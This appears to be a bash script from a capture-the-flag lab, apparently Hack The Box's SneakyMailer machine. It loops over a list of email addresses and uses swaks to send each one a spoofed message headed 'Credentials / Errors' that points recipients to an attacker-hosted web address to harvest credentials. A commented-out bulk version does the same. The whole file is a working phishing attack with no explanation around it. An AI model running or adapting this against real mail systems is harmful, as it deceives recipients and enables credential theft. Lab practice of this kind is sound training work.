#!/bin/bash

# bulk
# swaks --to `cat emails.list | tr '\n' ','` --from iamf@sneakymailer.htb \ 
# --header "Subject: Credentials / Errors" --body "goto http://10.10.14.42/" --server 10.10.10.197

while read mail; do swaks --to $mail --from iamf@sneakymailer.htb --header "Subject: Credentials /
Errors" --body "goto http://10.10.14.42/" --server 10.10.10.197; done < emails.list
